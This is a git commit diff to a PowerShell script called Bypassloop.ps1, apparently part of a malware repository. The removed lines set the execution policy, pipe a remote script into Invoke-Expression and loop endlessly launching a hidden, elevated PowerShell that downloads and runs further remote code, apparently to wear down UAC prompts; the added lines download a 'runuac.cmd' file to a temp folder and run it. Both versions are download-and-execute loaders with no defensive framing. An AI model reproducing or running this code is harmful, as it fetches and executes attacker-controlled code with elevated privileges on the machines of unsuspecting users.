36ec1c3104804c566576ac065243b025043f6094
43a1723 <hai1723notgay@gmail.com>
2024-06-06 18:19:46 +0700

    Update Bypassloop.ps1

--- Bypassloop.ps1
+++ Bypassloop.ps1
@@ -1,11 +1,2 @@
-Set-ExecutionPolicy -Scope CurrentUser Undefined -Force
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
-while($true)
- {
-	 try
-  {  
-    Start-Process 'powershell' -Verb runas -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& { $ProgressPreference = 'SilentlyContinue'; $t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t.Content -replace 'dropfileurl', 'https://raw.githubusercontent.com/43a1723/test/main/run.cmd' | Invoke-Expression }`"";exit
-     
-	}
-    catch{}   
-}
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/runuac.cmd" -OutFile "$temp\runuac.cmd"
+Start-Process -FilePath "$temp\runuac.cmd"
